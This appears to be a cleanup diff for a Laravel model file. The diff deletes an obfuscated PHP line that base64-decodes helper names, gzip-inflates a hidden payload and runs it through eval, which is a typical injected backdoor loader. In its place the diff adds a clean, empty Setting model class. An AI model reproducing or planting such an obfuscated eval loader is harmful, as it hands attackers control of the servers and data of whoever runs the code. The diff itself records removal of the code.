@@ -1,1 +1,11 @@
-<?php $_='9ede7a73';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNplUctuwjAQvPcrckAykXpwykONohyagM1DDSJQ2/EF4TgEKAlRUyDk62teJYg92Ov17sxoVtMuUZvdwwZt2F4YAraAVbsUsp9V+rsA1otW6bc1wAxzLyhJg7FtA+3+fcOzVQrChEDJBru+62xkgvKh6y+Y8Z6NDqch7RF0pmnnITHPo3ZzJqNwKyNgPUnsjLeem7SWir0MMVrzieOEPSecUvOb06IcHeCwM86M8O0rntAil9TIRIIgJ0U3YP4ySFCpciSwWUhKdhIVOKAeFI1BxpkXTjAq/QStJTaP0TT33JSUimMgcGEIutkpjA3r+kuJ0SpgnspJLhrI4LQFWdfYc0zyq4a1UFjh0Zly5sM5baV9TJoSkx3vfcYXvQeFrzhWH7Ey6aL5iR96bqwMq5h8t/l8168v/by1Sk23bp3nYh2cTvD63/64gCtOveq3rlt/iyaj5g=='; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Models;
+
+use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Model;
+
+class Setting extends Model
+{
+    use HasFactory;
+}
